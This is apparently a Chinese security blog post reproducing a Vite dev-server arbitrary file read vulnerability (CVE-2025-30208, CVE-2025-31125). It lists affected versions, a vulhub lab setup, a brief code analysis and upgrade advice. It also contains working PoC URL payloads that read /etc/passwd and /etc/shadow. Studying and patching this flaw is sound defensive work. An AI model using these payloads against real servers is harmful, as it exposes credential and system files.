#  【漏洞复现】Vite 任意文件读取漏洞   
PokerSec  PokerSec   2025-04-05 09:00  
  
**先关注，不迷路.**  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
Vite是一个现代前端构建工具，为Web项目提供更快、更精简的开发体验。它主要由两部分组成：具有热模块替换（HMR）功能的开发服务器，以及使用Rollup打包代码的构建命令。该漏洞允许攻击者通过构造特殊 URL 绕过 Vite 的文件访问限制，读取服务器上的任意文件内容。  
## 影响范围  
  
6.2.0 <= vite <= 6.2.3  
  
6.1.0 <= vite <= 6.1.2  
  
6.0.0 <= vite <= 6.0.12  
  
5.0.0 <= vite <= 5.4.15  
  
vite <= 4.5.10  
## CVE  
  
CVE-2025-30208  
  
CVE-2025-31125  
## 漏洞复现  
  
环境搭建：  
  
https://github.com/vulhub/vulhub/blob/master/vite/CVE-2025-30208  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeibotumiabo7ibokDPM4RBA8RLIE8FDBhibeQeLfheibiaNqueibD8lDaoQNugxqOg/640?wx_fmt=png&from=appmsg "")  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  
```
/@fs/etc/passwd?raw??
/@fs/etc/passwd?import&raw??
```  
  
CVE-2025-30208  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeibotuX6AryNZr9k3o3SshXJqIWiavWZSGicMHSuicuQRiaYrCWqsYibpNLefOWPw/640?wx_fmt=png&from=appmsg "")  
  
CVE-2025-31125  
```
/@fs/etc/shadow?logo.svg?.wasm?init
/@fs/etc/passwd?import&?inline=1.wasm?init
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeibotugxw0yGvrnfYYaVOwlnKcSQvePnvViayJTXEsSu9tyHAxfC27KqgNYdw/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeibotunobbSZbP2ibzZiaJ1qFwJicbZrq24mSicAM06QOmJkTnrribOMOFMFvO5mw/640?wx_fmt=png&from=appmsg "")  
  
满足id.endsWith(".wasm?init")，调用fileToUrl$1(this, id);也就是结尾需要满足.wasm?init  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeibotuj4KM5SlZ2oXBPEGLibWuIvoYbE4VUffzBkuYQ3DAvMHDsDJYTHFFQPQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeibotuc1Sjsa4lOoxFxN1YhvxcDBqk7gQlibEy3UlBNqUZ8yjz2nXkvkXf4Ow/640?wx_fmt=png&from=appmsg "")  
  
继续向下这里默认走的fileToDevUrl(environment, id)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeibotu24SDG00YR8GOQn01XicNXoK0LJt9SfTAJiasYf2cvtzx4xdNTb8ewOMg/640?wx_fmt=png&from=appmsg "")  
  
id调用cleanUrl生成file，会替换?#后面的内容，就只保留原始的数据了。如/etc/shadow?&raw??会被替换为/etc/shadow  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKUKZ2vlVnptmU2flmeiboturH47UrEVz5wIZuUyvkbIRPfBuIpqqWicIUtWMQaQCcicFmmXPhAbOGpw/640?wx_fmt=png&from=appmsg "")  
  
svg也能满足读取读取文件  
  
## 修复意见  
  
Vite 官方已发布安全补丁:  
https://vite.dev/  
  
请尽快通过 npm update vite 或手动升级到以上版本以修复漏洞。  
  
  
  
如有侵权，请及时联系删除。  
  
